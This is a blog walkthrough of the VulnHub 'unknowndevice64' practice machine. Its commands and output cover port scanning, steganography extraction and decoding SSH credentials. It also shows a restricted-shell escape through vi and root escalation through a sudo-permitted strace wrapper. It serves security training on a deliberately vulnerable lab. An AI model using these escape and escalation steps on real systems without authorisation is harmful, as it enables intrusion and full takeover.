---
title: "VulnHub - unknowndevice64 Walkthrough"
date: 2020-10-02
tags: [vulnhub, walkthrough, linux]
header:
  image: "/images/unknowndevice64-thumbnail.jpg"
excerpt: "Walkthroughs"
---

# VulnHub- unknowndevice64 Walkthrough

Hello, everyone. Today I will share the Boot to Root process in unknowndevice64 vulnerable machine. I will share only the successful way. There will not a lot of information.

## Information Gathering
We are starting with a **Nmap scan** to find open ports and services.

```
root@kali:~/unknowndevice64# nmap -p- -T4 -A unknowndevice64.local  
...
PORT STATE SERVICE VERSION  
1337/tcp open ssh OpenSSH 7.7 (protocol 2.0)  
...  
31337/tcp open http SimpleHTTPServer 0.6 (Python 2.7.14)  
...
```

Then I go to the **View Page Soure**  in the index of our victim's website.
I see something like this as HTML comment.
``` 
<p class="para" align="left"><p>Website By Unknowndevice64</p>  
<!-- key_is_h1dd3n.jpg -->
```
There is an image and nothing special. I think that this is more CTF-like box, so there can be some hidden comments in the metadata of the picture. It is embedded inside the image. It is **steganography**.

I try to check it using **steghide** command line utility.
```  
root@kali:~/unknowndevice64# steghide extract -sf key_is_h1dd3n.jpg  
Enter passphrase:  
wrote extracted data to "h1dd3n.txt".  
root@kali:~/unknowndevice64# cat h1dd3n.txt  
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>+++++++++++++++++.-----------------.<----------------.--.++++++.---------.>-----------------------.<<+++.++.>+++++.--.++++++++++++.>++++++++++++++++++++++++++++++++++++++++.-----------------.  
...
```
When we do this you see that it says "Enter passphrase:". Please pay  attention to the name of the image. "Key is h1dd3n". So I type *h1dd3n*.
It is **Brainfuck** encoded text. 
I decode it using my browser.
```
root@kali:~/unknowndevice64# cat >> user.txt  
ud64:1M!#64@ud  
```

I make a SSH session to the victim.
```
/root@kali:~/unknowndevice64# ssh ud64@unknowndevice64.local -p 1337  
ud64@unknowndevice64.local's password: 1M!#64@ud  
ud64@unknowndevice64_v1:~$
```

## Exploitation
We confronted with the **Restricted Shell**. It blocks most of the commands also using some signs (such as /, >, >> and etc.) in our arguments.

After that, I look for my available commands. I saw that I can use **vi**. So I agreed that I can **create Shell using Vi**.
```
ud64@unknowndevice64_v1:~$ vi  
:!/bin/bash   
bash-4.4$ sudo -l
```
The results of **sudoers file** show that I can use sysud64 command as root. I try to read more about this custom command.
```
# sysud64 -h | less
usage: strace [-CdffhiqrtttTvVwxxy] [-I n] [-e expr]...  
[-a column] [-o file] [-s strsize] [-P path]...  
-p pid... / [-D] [-E var=val]... [-u username] PROG [ARGS]  
or: strace -c[dfw] [-I n] [-e expr]... [-O overhead] [-S sortby]  
-p pid... / [-D]
...
```
It is clear that is a custom format of **strace** command. So I opened [GTFObins](https://gtfobins.github.io/) to look for how I can gain root access using **strace** command. It is a piece of cake.

```
bash-4.4$ sudo sysud64 -o /dev/null /bin/bash  
root@unknowndevice64_v1:/home/ud64# whoami  
root  
root@unknowndevice64_v1:/home/ud64# cd /root/  
root@unknowndevice64_v1:~# ls  
Desktop/ Documents/ Downloads/ Music/ Pictures/ Public/ Videos/ flag.txt  
root@unknowndevice64_v1:~# cat flag.txt  
___ _ _  
/ _ \ | | | |  
/ /_\ \ | |__ __ _ ___| | _____ _ __  
| _ | | '_ \ / _` |/ __| |/ / _ \ '__|  
| | | | | | | | (_| | (__| < __/ |  
\_| |_/ |_| |_|\__,_|\___|_|\_\___|_|  
  
  
_ __ _  
| | / _| | |  
__| | ___ ___ ___ | |_ ___ _ __ | | _____ _____  
/ _` |/ _ \ / _ \/ __| | _/ _ \| '__| | |/ _ \ \ / / _ \  
| (_| | (_) | __/\__ \ | || (_) | | | | (_) \ V / __/  
\__,_|\___/ \___||___/ |_| \___/|_| |_|\___/ \_/ \___|  
  
  
_ _ _ _  
| | | | | | | |  
__ _| |__ __ _| |_ ___ | |_| |__ ___ _ __ ___  
\ \ /\ / / '_ \ / _` | __| / _ \| __| '_ \ / _ \ '__/ __|  
\ V V /| | | | (_| | |_ | (_) | |_| | | | __/ | \__ \  
\_/\_/ |_| |_|\__,_|\__| \___/ \__|_| |_|\___|_| |___/  
  
  
_ _ _ _  
| | | | | | | |  
__ _____ _ _| | __| | _ __ ___ | |_ __| | ___  
\ \ /\ / / _ \| | | | |/ _` | | '_ \ / _ \| __| / _` |/ _ \  
\ V V / (_) | |_| | | (_| | | | | | (_) | |_ | (_| | (_) |  
\_/\_/ \___/ \__,_|_|\__,_| |_| |_|\___/ \__| \__,_|\___/  
  
  
__  
/ _|  
| |_ ___ _ __ _ __ ___ ___ _ __ ___ _ _  
| _/ _ \| '__| | '_ ` _ \ / _ \| '_ \ / _ \ | | |  
| || (_) | | | | | | | | (_) | | | | __/ |_| |_  
|_| \___/|_| |_| |_| |_|\___/|_| |_|\___|\__, (_)  
__/ |  
|___/  
  
  
  
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _  
/ \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \  
( . | / | u | n | k | n | o | w | n | d | e | v | i | c | e | 6 | 4 )  
\_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/  
  
root@unknowndevice64_v1:~#
```
Victory! Thanks for reading!